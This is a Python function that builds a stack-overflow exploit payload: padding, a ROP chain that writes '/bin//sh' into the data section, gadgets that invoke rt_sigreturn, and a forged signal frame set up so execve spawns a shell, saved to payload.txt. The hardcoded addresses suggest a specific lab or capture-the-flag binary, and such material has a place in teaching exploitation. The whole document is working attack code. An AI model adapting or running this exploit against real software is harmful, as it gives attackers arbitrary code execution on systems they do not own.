def execve():                                                                   
                                                                                
    # Add the initial junk                                                      
    payload = b''                                                               
    payload += b'\x41' * 120                                                    
                                                                                
    # Writing the string "/bin//sh" into the data section.                      
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e0)    # .data                 
    payload += struct.pack('<Q', 0x00000000004005af)    # pop rax; ret          
    payload += b'/bin//sh'                                                      
    payload += struct.pack('<Q', 0x000000000047eff1)    # mov qword ptr [rsi], rax; ret
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8             
    payload += struct.pack('<Q', 0x00000000004440c0)    # xor rax, rax; ret        
    payload += struct.pack('<Q', 0x000000000047eff1)    # mov qword ptr [rsi], rax; ret
    payload += struct.pack('<Q', 0x00000000004006a6)    # pop rdi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e0)    # .data                 
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8             
    payload += struct.pack('<Q', 0x0000000000448d85)    # pop rdx; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8             
                                                                                
    # Let us first call the rt_sigreturn                                        
    # __restore_rt is generally not found in binaries.                          
    # Let us use Gadgets (ROP-style) and get it done.                           
    payload += struct.pack('<Q', 0x00000000004440c0)    # xor rax, rax; ret        
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x000000000040125c)    # syscall               
                                                                                
    # Now, let us construct the first sigframe                                  
    # which will be loaded by the above rt_sigreturn.                           
    # 1. ucontext                                                               
    payload += struct.pack('<Q', 0x0000000000000007)    # uc_flags              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_link               
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_sp        
    payload += struct.pack('<Q', 0x0000ffff00000000)    # uc_stack.ss_flags     
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_size      
                                                                                
    # 2. General Purpose Registers                                              
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R8                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R9                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R10                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R11                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R12                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R13                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R14                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R15
    # 3. First argument for execve() = location of "/bin//sh"                   
    payload += struct.pack('<Q', 0x00000000006b90e0)    # RDI = location of "/bin//sh"
                                                                                
    # 4. Second argument for execve() = NULL                                    
    payload += struct.pack('<Q', 0x0000000000000000)    # RSI = NULL            
                                                                                
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBP                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBX                   
                                                                                
    # 5. Third argument for execve() = NULL                                     
    payload += struct.pack('<Q', 0x0000000000000000)    # RDX = NULL            
                                                                                
    # 5. execve()'s system call number                                          
    payload += struct.pack('<Q', 0x000000000000003b)    # RAX = execve's system call number = 59
                                                                                
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RCX                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RSP                   
                                                                                
    # 5. Finally what to execute                                                
    payload += struct.pack('<Q', 0x000000000040125c)    # RIP = should call 'syscall' instruction
                                                                                
    # Rest of it                                                                
    payload += struct.pack('<Q', 0x0000000000000202)    # EFLAGS - Some value   
    payload += struct.pack('<Q', 0x002b000000000033)    # Segment Registers(SS, FS, GS, CS)
    payload += struct.pack('<Q', 0x0000000000000000)    # ERR                   
    payload += struct.pack('<Q', 0x0000000000000001)    # TrapNo                
    payload += struct.pack('<Q', 0x0000000000000000)    # Old-Mask              
    payload += struct.pack('<Q', 0x0000000000000000)    # CR2                   
    payload += struct.pack('<Q', 0x0000000000000000)    # fpstate = NULL        
    payload += struct.pack('<Q', 0x000000000000000e)    # reserved              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_sigmask            
                                                                                
    # Ignoring siginfo.                                                         
                                                                                
    # Writing the payload into a file.
    fo = open('payload.txt', 'wb')                                              
    fo.write(payload)                                                           
    fo.close()

